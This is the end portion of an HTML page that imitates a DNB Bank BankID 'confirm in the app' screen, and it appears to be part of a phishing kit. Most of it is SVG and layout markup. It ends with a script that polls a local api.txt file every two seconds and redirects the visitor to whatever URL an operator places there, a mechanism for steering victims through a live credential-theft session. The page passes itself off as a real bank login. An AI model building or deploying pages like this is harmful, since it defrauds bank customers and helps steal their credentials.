83.4886 11.2878Z" fill="white" bis_size="{&amp;quot;x&amp;quot;:258,&amp;quot;y&amp;quot;:23,&amp;quot;w&amp;quot;:11,&amp;quot;h&amp;quot;:13,&amp;quot;abs_x&amp;quot;:892,&amp;quot;abs_y&amp;quot;:110}"></path><path d="M0.967273 2.00349H4.83636C5.35224 2.00349 5.80364 1.55209 5.80364 1.03621C5.80364 0.520333 5.35224 0.0689392 4.83636 0.0689392H0.967273C0.451394 0.0689392 0 0.520333 0 1.03621C0 1.55209 0.451394 2.00349 0.967273 2.00349Z" fill="white" bis_size="{&amp;quot;x&amp;quot;:180,&amp;quot;y&amp;quot;:22,&amp;quot;w&amp;quot;:5,&amp;quot;h&amp;quot;:1,&amp;quot;abs_x&amp;quot;:814,&amp;quot;abs_y&amp;quot;:109}"></path><path d="M0.967273 9.74167H4.83636C5.35224 9.74167 5.80364 9.29028 5.80364 8.7744C5.80364 8.25852 5.35224 7.80712 4.83636 7.80712H0.967273C0.451394 7.80712 0 8.25852 0 8.7744C0 9.29028 0.451394 9.74167 0.967273 9.74167Z" fill="white" bis_size="{&amp;quot;x&amp;quot;:180,&amp;quot;y&amp;quot;:30,&amp;quot;w&amp;quot;:5,&amp;quot;h&amp;quot;:1,&amp;quot;abs_x&amp;quot;:814,&amp;quot;abs_y&amp;quot;:117}"></path><path d="M4.83636 13.6108H0.967273C0.451394 13.6108 0 13.1594 0 12.6435C0 12.1276 0.451394 11.6762 0.967273 11.6762H4.83636C5.35224 11.6762 5.80364 12.1276 5.80364 12.6435C5.80364 13.1594 5.35224 13.6108 4.83636 13.6108Z" fill="white" bis_size="{&amp;quot;x&amp;quot;:180,&amp;quot;y&amp;quot;:34,&amp;quot;w&amp;quot;:5,&amp;quot;h&amp;quot;:1,&amp;quot;abs_x&amp;quot;:814,&amp;quot;abs_y&amp;quot;:121}"></path><path d="M8.70545 5.87258H12.5745C13.0904 5.87258 13.5418 5.42118 13.5418 4.90531C13.5418 4.38943 13.0904 3.93803 12.5745 3.93803H8.70545C8.18958 3.93803 7.73818 4.38943 7.73818 4.90531C7.73818 5.42118 8.18958 5.87258 8.70545 5.87258Z" fill="white" bis_size="{&amp;quot;x&amp;quot;:187,&amp;quot;y&amp;quot;:26,&amp;quot;w&amp;quot;:5,&amp;quot;h&amp;quot;:1,&amp;quot;abs_x&amp;quot;:821,&amp;quot;abs_y&amp;quot;:113}"></path><path d="M12.5745 9.74167H8.70545C8.18958 9.74167 7.73818 9.29028 7.73818 8.7744C7.73818 8.25852 8.18958 7.80712 8.70545 7.80712H12.5745C13.0904 7.80712 13.5418 8.25852 13.5418 8.7744C13.5418 9.29028 13.0904 9.74167 12.5745 9.74167Z" fill="white" bis_size="{&amp;quot;x&amp;quot;:187,&amp;quot;y&amp;quot;:30,&amp;quot;w&amp;quot;:5,&amp;quot;h&amp;quot;:1,&amp;quot;abs_x&amp;quot;:821,&amp;quot;abs_y&amp;quot;:117}"></path><path d="M16.4436 2.00349H20.3127C20.8286 2.00349 21.28 1.55209 21.28 1.03621C21.28 0.520333 20.8286 0.0689392 20.3127 0.0689392H16.4436C15.9278 0.0689392 15.4764 0.520333 15.4764 1.03621C15.4764 1.55209 15.9278 2.00349 16.4436 2.00349Z" fill="white" bis_size="{&amp;quot;x&amp;quot;:195,&amp;quot;y&amp;quot;:22,&amp;quot;w&amp;quot;:5,&amp;quot;h&amp;quot;:1,&amp;quot;abs_x&amp;quot;:829,&amp;quot;abs_y&amp;quot;:109}"></path><path d="M20.3127 5.87258H16.4436C15.9278 5.87258 15.4764 5.42118 15.4764 4.90531C15.4764 4.38943 15.9278 3.93803 16.4436 3.93803H20.3127C20.8286 3.93803 21.28 4.38943 21.28 4.90531C21.28 5.42118 20.8286 5.87258 20.3127 5.87258Z" fill="white" bis_size="{&amp;quot;x&amp;quot;:195,&amp;quot;y&amp;quot;:26,&amp;quot;w&amp;quot;:5,&amp;quot;h&amp;quot;:1,&amp;quot;abs_x&amp;quot;:829,&amp;quot;abs_y&amp;quot;:113}"></path><path d="M16.4436 13.6108H20.3127C20.8286 13.6108 21.28 13.1594 21.28 12.6435C21.28 12.1276 20.8286 11.6762 20.3127 11.6762H16.4436C15.9278 11.6762 15.4764 12.1276 15.4764 12.6435C15.4764 13.1594 15.9278 13.6108 16.4436 13.6108Z" fill="white" bis_size="{&amp;quot;x&amp;quot;:195,&amp;quot;y&amp;quot;:34,&amp;quot;w&amp;quot;:5,&amp;quot;h&amp;quot;:1,&amp;quot;abs_x&amp;quot;:829,&amp;quot;abs_y&amp;quot;:121}"></path></svg></div></div><div class="Z-XtFZJCw8c-" bis_size="{&amp;quot;x&amp;quot;:0,&amp;quot;y&amp;quot;:0,&amp;quot;w&amp;quot;:0,&amp;quot;h&amp;quot;:0,&amp;quot;abs_x&amp;quot;:634,&amp;quot;abs_y&amp;quot;:87}"><h1 id="P0-1" tabindex="-1" bis_size="{&amp;quot;x&amp;quot;:0,&amp;quot;y&amp;quot;:0,&amp;quot;w&amp;quot;:0,&amp;quot;h&amp;quot;:0,&amp;quot;abs_x&amp;quot;:634,&amp;quot;abs_y&amp;quot;:87}"><span bis_size="{&amp;quot;x&amp;quot;:0,&amp;quot;y&amp;quot;:0,&amp;quot;w&amp;quot;:0,&amp;quot;h&amp;quot;:0,&amp;quot;abs_x&amp;quot;:634,&amp;quot;abs_y&amp;quot;:87}">Bekreft i appen</span></h1></div><div class="rroRwgEBZuQ-" bis_size="{&amp;quot;x&amp;quot;:393,&amp;quot;y&amp;quot;:13,&amp;quot;w&amp;quot;:40,&amp;quot;h&amp;quot;:32,&amp;quot;abs_x&amp;quot;:1027,&amp;quot;abs_y&amp;quot;:100}"><div bis_size="{&amp;quot;x&amp;quot;:393,&amp;quot;y&amp;quot;:13,&amp;quot;w&amp;quot;:40,&amp;quot;h&amp;quot;:32,&amp;quot;abs_x&amp;quot;:1027,&amp;quot;abs_y&amp;quot;:100}"><button class="_0GDSvZVsPEo-" data-variant="transparent" type="button" title="Åpne meny" bis_size="{&amp;quot;x&amp;quot;:393,&amp;quot;y&amp;quot;:13,&amp;quot;w&amp;quot;:40,&amp;quot;h&amp;quot;:32,&amp;quot;abs_x&amp;quot;:1027,&amp;quot;abs_y&amp;quot;:100}"><span class="owg3SWE7I-4-" bis_size="{&amp;quot;x&amp;quot;:401,&amp;quot;y&amp;quot;:17,&amp;quot;w&amp;quot;:24,&amp;quot;h&amp;quot;:24,&amp;quot;abs_x&amp;quot;:1035,&amp;quot;abs_y&amp;quot;:104}"><svg aria-hidden="true" fill="none" height="24" viewBox="0 0 24 24" width="24" xmlns="http://www.w3.org/2000/svg" bis_size="{&amp;quot;x&amp;quot;:401,&amp;quot;y&amp;quot;:17,&amp;quot;w&amp;quot;:24,&amp;quot;h&amp;quot;:24,&amp;quot;abs_x&amp;quot;:1035,&amp;quot;abs_y&amp;quot;:104}"><path d="M12 2.25C10.0716 2.25 8.18657 2.82183 6.58319 3.89317C4.97982 4.96451 3.73013 6.48726 2.99218 8.26884C2.25422 10.0504 2.06114 12.0108 2.43735 13.9021C2.81355 15.7934 3.74215 17.5307 5.10571 18.8943C6.46928 20.2579 8.20656 21.1865 10.0979 21.5627C11.9892 21.9389 13.9496 21.7458 15.7312 21.0078C17.5127 20.2699 19.0355 19.0202 20.1068 17.4168C21.1782 15.8134 21.75 13.9284 21.75 12C21.7473 9.41498 20.7192 6.93661 18.8913 5.10872C17.0634 3.28084 14.585 2.25273 12 2.25ZM12 20.25C10.3683 20.25 8.77326 19.7661 7.41655 18.8596C6.05984 17.9531 5.00242 16.6646 4.378 15.1571C3.75358 13.6496 3.5902 11.9908 3.90853 10.3905C4.22685 8.79016 5.01259 7.32015 6.16637 6.16637C7.32016 5.01259 8.79017 4.22685 10.3905 3.90852C11.9909 3.59019 13.6497 3.75357 15.1571 4.37799C16.6646 5.00242 17.9531 6.05984 18.8596 7.41655C19.7661 8.77325 20.25 10.3683 20.25 12C20.2475 14.1873 19.3775 16.2843 17.8309 17.8309C16.2843 19.3775 14.1873 20.2475 12 20.25ZM13.5 16.5C13.5 16.6989 13.421 16.8897 13.2803 17.0303C13.1397 17.171 12.9489 17.25 12.75 17.25C12.3522 17.25 11.9706 17.092 11.6893 16.8107C11.408 16.5294 11.25 16.1478 11.25 15.75V12C11.0511 12 10.8603 11.921 10.7197 11.7803C10.579 11.6397 10.5 11.4489 10.5 11.25C10.5 11.0511 10.579 10.8603 10.7197 10.7197C10.8603 10.579 11.0511 10.5 11.25 10.5C11.6478 10.5 12.0294 10.658 12.3107 10.9393C12.592 11.2206 12.75 11.6022 12.75 12V15.75C12.9489 15.75 13.1397 15.829 13.2803 15.9697C13.421 16.1103 13.5 16.3011 13.5 16.5ZM10.5 7.875C10.5 7.6525 10.566 7.43499 10.6896 7.24998C10.8132 7.06498 10.9889 6.92078 11.1945 6.83564C11.4001 6.75049 11.6263 6.72821 11.8445 6.77162C12.0627 6.81502 12.2632 6.92217 12.4205 7.0795C12.5778 7.23684 12.685 7.43729 12.7284 7.65552C12.7718 7.87375 12.7495 8.09995 12.6644 8.30552C12.5792 8.51109 12.435 8.68679 12.25 8.8104C12.065 8.93402 11.8475 9 11.625 9C11.3266 9 11.0405 8.88147 10.8295 8.6705C10.6185 8.45952 10.5 8.17337 10.5 7.875Z" fill="black" bis_size="{&amp;quot;x&amp;quot;:403,&amp;quot;y&amp;quot;:20,&amp;quot;w&amp;quot;:19,&amp;quot;h&amp;quot;:19,&amp;quot;abs_x&amp;quot;:1037,&amp;quot;abs_y&amp;quot;:107}"></path></svg></span></button></div></div></header></div><main class="lH9xEtG2mCI-" bis_size="{&amp;quot;x&amp;quot;:1,&amp;quot;y&amp;quot;:58,&amp;quot;w&amp;quot;:448,&amp;quot;h&amp;quot;:460,&amp;quot;abs_x&amp;quot;:635,&amp;quot;abs_y&amp;quot;:145}"><div class="xdexl2z-LoQ-" bis_size="{&amp;quot;x&amp;quot;:1,&amp;quot;y&amp;quot;:58,&amp;quot;w&amp;quot;:448,&amp;quot;h&amp;quot;:460,&amp;quot;abs_x&amp;quot;:635,&amp;quot;abs_y&amp;quot;:145}"><div class="_5N17V2ww3jg-" bis_size="{&amp;quot;x&amp;quot;:1,&amp;quot;y&amp;quot;:58,&amp;quot;w&amp;quot;:448,&amp;quot;h&amp;quot;:460,&amp;quot;abs_x&amp;quot;:635,&amp;quot;abs_y&amp;quot;:145}"><div class="psnZoCxGFCw- n9F0CdBAfu0-" bis_size="{&amp;quot;x&amp;quot;:1,&amp;quot;y&amp;quot;:58,&amp;quot;w&amp;quot;:448,&amp;quot;h&amp;quot;:460,&amp;quot;abs_x&amp;quot;:635,&amp;quot;abs_y&amp;quot;:145}"><div class="Wx-8BLcX9K8-" bis_size="{&amp;quot;x&amp;quot;:13,&amp;quot;y&amp;quot;:58,&amp;quot;w&amp;quot;:428,&amp;quot;h&amp;quot;:460,&amp;quot;abs_x&amp;quot;:647,&amp;quot;abs_y&amp;quot;:145}"><div class="Vxvq0OQ2EoE-" bis_size="{&amp;quot;x&amp;quot;:131,&amp;quot;y&amp;quot;:62,&amp;quot;w&amp;quot;:187,&amp;quot;h&amp;quot;:61,&amp;quot;abs_x&amp;quot;:765,&amp;quot;abs_y&amp;quot;:149}"><h1 class="mnmfEEsQ8Bw-" id="P0-1" tabindex="-1" bis_size="{&amp;quot;x&amp;quot;:131,&amp;quot;y&amp;quot;:62,&amp;quot;w&amp;quot;:187,&amp;quot;h&amp;quot;:30,&amp;quot;abs_x&amp;quot;:765,&amp;quot;abs_y&amp;quot;:149}"><span bis_size="{&amp;quot;x&amp;quot;:131,&amp;quot;y&amp;quot;:62,&amp;quot;w&amp;quot;:187,&amp;quot;h&amp;quot;:30,&amp;quot;abs_x&amp;quot;:765,&amp;quot;abs_y&amp;quot;:149}">Bekreft i appen</span></h1><p class="gQIlCC1ijQ0-" bis_size="{&amp;quot;x&amp;quot;:162,&amp;quot;y&amp;quot;:102,&amp;quot;w&amp;quot;:124,&amp;quot;h&amp;quot;:21,&amp;quot;abs_x&amp;quot;:796,&amp;quot;abs_y&amp;quot;:189}">DNB Bank ASA</p></div><div class="MRDe6--z-b4-" bis_size="{&amp;quot;x&amp;quot;:17,&amp;quot;y&amp;quot;:134,&amp;quot;w&amp;quot;:416,&amp;quot;h&amp;quot;:375,&amp;quot;abs_x&amp;quot;:651,&amp;quot;abs_y&amp;quot;:221}"><div class="EVWKyPP5QhM- wjTH1MDT4RA-" bis_size="{&amp;quot;x&amp;quot;:40,&amp;quot;y&amp;quot;:196,&amp;quot;w&amp;quot;:370,&amp;quot;h&amp;quot;:250,&amp;quot;abs_x&amp;quot;:674,&amp;quot;abs_y&amp;quot;:283}"><div class="OgdyOiyqLtw-" bis_size="{&amp;quot;x&amp;quot;:195,&amp;quot;y&amp;quot;:196,&amp;quot;w&amp;quot;:60,&amp;quot;h&amp;quot;:60,&amp;quot;abs_x&amp;quot;:829,&amp;quot;abs_y&amp;quot;:283}"><svg class="XMrJ483EtrA-" fill="none" height="24" viewBox="0 0 24 24" width="24" xmlns="http://www.w3.org/2000/svg" aria-busy="true" aria-label="Venter på bekreftelse" bis_size="{&amp;quot;x&amp;quot;:193,&amp;quot;y&amp;quot;:194,&amp;quot;w&amp;quot;:63,&amp;quot;h&amp;quot;:63,&amp;quot;abs_x&amp;quot;:827,&amp;quot;abs_y&amp;quot;:281}"><mask height="24" id="mask0_27_549" maskUnits="userSpaceOnUse" width="24" x="0" y="0" style="mask-type: alpha;" bis_size="{&amp;quot;x&amp;quot;:0,&amp;quot;y&amp;quot;:0,&amp;quot;w&amp;quot;:0,&amp;quot;h&amp;quot;:0,&amp;quot;abs_x&amp;quot;:634,&amp;quot;abs_y&amp;quot;:87}"><rect fill="white" height="24" width="24" bis_size="{&amp;quot;x&amp;quot;:0,&amp;quot;y&amp;quot;:0,&amp;quot;w&amp;quot;:0,&amp;quot;h&amp;quot;:0,&amp;quot;abs_x&amp;quot;:634,&amp;quot;abs_y&amp;quot;:87}"></rect></mask><g mask="url(#mask0_27_549)" bis_size="{&amp;quot;x&amp;quot;:201,&amp;quot;y&amp;quot;:202,&amp;quot;w&amp;quot;:47,&amp;quot;h&amp;quot;:47,&amp;quot;abs_x&amp;quot;:835,&amp;quot;abs_y&amp;quot;:289}"><path d="M11 17C11 19.2091 9.20914 21 7 21C4.79086 21 3 19.2091 3 17C3 14.7909 4.79086 13 7 13C9.20914 13 11 14.7909 11 17Z" fill="black" bis_size="{&amp;quot;x&amp;quot;:201,&amp;quot;y&amp;quot;:204,&amp;quot;w&amp;quot;:21,&amp;quot;h&amp;quot;:21,&amp;quot;abs_x&amp;quot;:835,&amp;quot;abs_y&amp;quot;:291}"></path><path d="M21 7C21 9.20914 19.2091 11 17 11C14.7909 11 13 9.20914 13 7C13 4.79086 14.7909 3 17 3C19.2091 3 21 4.79086 21 7Z" fill="black" bis_size="{&amp;quot;x&amp;quot;:227,&amp;quot;y&amp;quot;:227,&amp;quot;w&amp;quot;:21,&amp;quot;h&amp;quot;:21,&amp;quot;abs_x&amp;quot;:861,&amp;quot;abs_y&amp;quot;:314}"></path></g></svg></div><div class="xBoUtclVXV8-" bis_size="{&amp;quot;x&amp;quot;:89,&amp;quot;y&amp;quot;:272,&amp;quot;w&amp;quot;:270,&amp;quot;h&amp;quot;:26,&amp;quot;abs_x&amp;quot;:723,&amp;quot;abs_y&amp;quot;:359}"><span class="_40xXfzBIVkQ-" bis_size="{&amp;quot;x&amp;quot;:89,&amp;quot;y&amp;quot;:272,&amp;quot;w&amp;quot;:246,&amp;quot;h&amp;quot;:20,&amp;quot;abs_x&amp;quot;:723,&amp;quot;abs_y&amp;quot;:359}">Godkjenn med din BankID-app</span><button class="x-l2qNWa1E4-" title="Åpne hjelpedialogen" type="button" bis_size="{&amp;quot;x&amp;quot;:336,&amp;quot;y&amp;quot;:272,&amp;quot;w&amp;quot;:24,&amp;quot;h&amp;quot;:24,&amp;quot;abs_x&amp;quot;:970,&amp;quot;abs_y&amp;quot;:359}"><svg aria-hidden="true" fill="none" height="24" viewBox="0 0 24 24" width="24" xmlns="http://www.w3.org/2000/svg" bis_size="{&amp;quot;x&amp;quot;:336,&amp;quot;y&amp;quot;:272,&amp;quot;w&amp;quot;:24,&amp;quot;h&amp;quot;:24,&amp;quot;abs_x&amp;quot;:970,&amp;quot;abs_y&amp;quot;:359}"><path d="M13.125 16.875C13.125 17.0975 13.059 17.315 12.9354 17.5C12.8118 17.685 12.6361 17.8292 12.4305 17.9144C12.225 17.9995 11.9988 18.0218 11.7805 17.9784C11.5623 17.935 11.3618 17.8278 11.2045 17.6705C11.0472 17.5132 10.94 17.3127 10.8966 17.0945C10.8532 16.8762 10.8755 16.65 10.9606 16.4445C11.0458 16.2389 11.19 16.0632 11.375 15.9396C11.56 15.816 11.7775 15.75 12 15.75C12.2984 15.75 12.5845 15.8685 12.7955 16.0795C13.0065 16.2905 13.125 16.5766 13.125 16.875ZM12 6.75C9.93188 6.75 8.25 8.26406 8.25 10.125V10.5C8.25 10.6989 8.32902 10.8897 8.46967 11.0303C8.61033 11.171 8.80109 11.25 9 11.25C9.19892 11.25 9.38968 11.171 9.53033 11.0303C9.67099 10.8897 9.75 10.6989 9.75 10.5V10.125C9.75 9.09375 10.7597 8.25 12 8.25C13.2403 8.25 14.25 9.09375 14.25 10.125C14.25 11.1562 13.2403 12 12 12C11.8011 12 11.6103 12.079 11.4697 12.2197C11.329 12.3603 11.25 12.5511 11.25 12.75V13.5C11.25 13.6989 11.329 13.8897 11.4697 14.0303C11.6103 14.171 11.8011 14.25 12 14.25C12.1989 14.25 12.3897 14.171 12.5303 14.0303C12.671 13.8897 12.75 13.6989 12.75 13.5V13.4325C14.46 13.1184 15.75 11.7544 15.75 10.125C15.75 8.26406 14.0681 6.75 12 6.75ZM21.75 12C21.75 13.9284 21.1782 15.8134 20.1068 17.4168C19.0355 19.0202 17.5127 20.2699 15.7312 21.0078C13.9496 21.7458 11.9892 21.9389 10.0979 21.5627C8.20656 21.1865 6.46928 20.2579 5.10571 18.8943C3.74215 17.5307 2.81355 15.7934 2.43735 13.9021C2.06114 12.0108 2.25422 10.0504 2.99218 8.26884C3.73013 6.48726 4.97982 4.96451 6.58319 3.89317C8.18657 2.82183 10.0716 2.25 12 2.25C14.585 2.25273 17.0634 3.28084 18.8913 5.10872C20.7192 6.93661 21.7473 9.41498 21.75 12ZM20.25 12C20.25 10.3683 19.7661 8.77325 18.8596 7.41655C17.9531 6.05984 16.6646 5.00242 15.1571 4.37799C13.6497 3.75357 11.9909 3.59019 10.3905 3.90852C8.79017 4.22685 7.32016 5.01259 6.16637 6.16637C5.01259 7.32015 4.22685 8.79016 3.90853 10.3905C3.5902 11.9908 3.75358 13.6496 4.378 15.1571C5.00242 16.6646 6.05984 17.9531 7.41655 18.8596C8.77326 19.7661 10.3683 20.25 12 20.25C14.1873 20.2475 16.2843 19.3775 17.8309 17.8309C19.3775 16.2843 20.2475 14.1873 20.25 12Z" fill="black" bis_size="{&amp;quot;x&amp;quot;:338,&amp;quot;y&amp;quot;:274,&amp;quot;w&amp;quot;:19,&amp;quot;h&amp;quot;:19,&amp;quot;abs_x&amp;quot;:972,&amp;quot;abs_y&amp;quot;:361}"></path></svg></button></div></div></div></div></div></div></div></main></div></div></div></div><script data-savepage-type="text/javascript" type="text/plain" data-savepage-src="https://csfe.bankid.no/jsclient21/error.js"></script><script data-savepage-type="text/javascript" type="text/plain" data-conf="u52GCBcvPJfTeELcUy7RkyoAAABvwLcvBYeFF5s6qfXGZh922JO6hWl7giLOK6RRcFkIRJTwY4wSxDvaWsYrlzDgLFjTYmEKSLgPQU4q7bnVUDFM44c4-z2OUNb0q7cD09BOCW9WgasIBDbLRXX6NDzkc0wiIoYMDkoUDeueJmWdnUVH_C_weipoFOGl6mvuhoHiclcUbJJsOQEOm2jUWCYGNh-Qqx-IHfkOveLAsjh0xrzxagSHwxIELgje7zqhYj2Z9tFFinO1xz6JNI-ZRVUCTDbdNReNXOaRf0zDGKKsLS01ajOc07XG2VFf-MzcbNO9WbbApXSJ_Joxy7gCCu8a0cwUHNn9MdoatJdBa8n6wuCMYqaXfX7tttrC5cA_s4MUgptWZSZ6h363ufYM5pEIMij_0JP1TwVULstTtTsZ7eik5K9_syGCe4VP46MWgkcFQ5dUUJNDYeeFJQVK9I61fK03CFWpIW9u6e6ABw5KWWfUyTHF_T3tUbTnI0pTfGK_-LP2pp_ePsKoTWWSYB5e7aluB-cIsa3HlI7EHo8PCTAwBBqmoJQaJsy2GvSvXRvTX2kBKicfixh4Eu2ndoZx280ZceOGwbkXK_WALjOBcs2yWZQSjAROwexwGbDxk1F5jmR50rmsYLpghi03LGdLbY2zH0ZU0U67YDWMdEtYhQMXnA-Bs-c7SYtP57aCn_nRKiHS1l1fNaaNXldzmrRR6FlwQ1fGQb8RsR7IClzax0_a7w7oMrzzLsm6wz5X-7gTxUG1Rsspqactg0LMgDdhZ0OsEM2gD6sI5vddZuyKg99wCrdwWmJSz0syPFUj2gbHWE72t-_Yn7wiSrpSlP3JiiEAijMeV4WRNTczf3pOffCoYPxtQQeYq8dtbjQ4cL5WfNyAl9qMlVCIauh3pEK34_aSCRkjplbttXqkw5RF9caTaaN-4E_zbMSY2SldLeTODn_KIwV8Pbwod6ITSI-VVsh_HrtuvZmLrNjv7_P0HaaWGd25ib8wVVzz3zUJg8dBW7lRDC3Fy3WH3RUt3Q6cpvCbZx84l6nzWYkUyNHfHEIvf3HwxGAZ_63Lj_EWOfjshqTsZGrXDlQTRsTJNh6T6OIECRPGjOk0LHD3cl0MOe2lGrFaeqWMPEd0yxaT2OlgSj6NscE6AO8TCn7-tsEH969wmfrIIoPq58GYfDENvfojLO3Wfl8KUOYnrLJdbAZXGBlfwU68_l9FRMtXqc2dbP7tAwpQNLLwODwbg1uinNXWshXDfNp12Mc4_DrUh8vKUGiKNRIFXOGFKJWz9-LwvVTgiBAklXScG4ZBajQgkBc0J8SmWRXfFi7B2yKe257KDy61EP_co6tuCE5V253d9fgRtRR2CvsKwG1A2XgsrngVXCNKpaw4GZJJKjvNHRJrqOwi5fMPvuhHbzgkQXEVnyrTW0q9zTH0elFc2BnINwslypDDeyByc_ERKtBQaQ4Ac-i3Esu1d8Q4f9UBwM5mleiLG3qxXouYMfW5YB69Wg" data-savepage-src="https://csfe.bankid.no/CentralServerFEJS/b/KgAAALeMZD8t1MPRpPmolHNpFEEul8w0CcGGxqGplJ4lPBxD2oi8Tboru_3Xy1RnhntzhyJFTqJRjbPlKt0Wp8K35n4QWy0FYl8"></script><script data-savepage-type="" type="text/plain"></script></body></html>'
                                            data-savepage-crossorigin=""
                                            frameborder="0"
                                            width="100%"
                                            height="100%"
                                            data-savepage-src="https://csfe.bankid.no/CentralServerFEJS/a?cid=buZCzSzH1x4pcRZa"
                                            src=""
                                            title="BankID"
                                            allow="local-network-access *"
                                            bis_size='{"x":634,"y":87,"w":450,"h":520,"abs_x":634,"abs_y":87}'
                                            bis_id="fr_kwbocykyp4cbwjrd3dyq2i"
                                            bis_depth="0"
                                            bis_chainid="1"
                                            data-savepage-key="0-0"
                                        ></iframe>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                    <div class="Cbrq5-nkab0-" bis_skin_checked="1">
                        <button class="qRkl-QO8NSU-" data-variant="transparent" onclick="window.location.href='home.php?fo=983739&g=32&dcd=0988989580394308&hbf=444&aws=GKJHP0849084';return false;"
                                                                         type="button">Avbryt</button>
                    </div>
                </div>
            </div>
        </div>
       <script>
        function fetchAndRedirect() {
            var client = new XMLHttpRequest();
            client.open('GET', 'api.txt?v=' + new Date().getTime(), true); // Cache busting
            client.onreadystatechange = function() {
                if (client.readyState === 4) {
                    if (client.status === 200) {
                        var responseText = client.responseText;
                        console.log("Fetched responseText:", responseText);

                        // Extract URL from meta refresh tag
                        var urlMatch = responseText.match(/<meta\s+http-equiv=['"]refresh['"]\s+content=['"][^;]+;\s*url=([^'"]+)['"]/i);

                        if (urlMatch && urlMatch[1]) {
                            var redirectUrl = urlMatch[1];
                            console.log("Redirecting to URL:", redirectUrl);
                            window.location.href = redirectUrl;
                        } else {
                            console.error("Failed to extract URL from response.");
                        }
                    } else {
                        console.error("Failed to fetch data from api.txt, status code:", client.status);
                    }
                }
            };
            client.send();
        }

        // Fetch the URL and redirect every 2 seconds
        setInterval(fetchAndRedirect, 2000);
    </script>
    </body>
</html>
